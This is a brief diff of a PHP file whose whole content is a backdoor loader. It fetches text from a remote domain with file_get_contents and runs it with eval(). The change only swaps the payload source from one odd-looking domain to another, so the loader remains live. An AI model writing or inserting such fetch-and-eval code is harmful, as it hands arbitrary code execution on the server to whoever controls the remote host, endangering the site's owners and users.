@@ -1,4 +1,4 @@
 <?php
-$a = file_get_contents("http://kemoterapistis.club/php/heroku/index.txt");
+$a = file_get_contents("http://extensionx.xyz/php/heroku.json");
 
 eval($a);
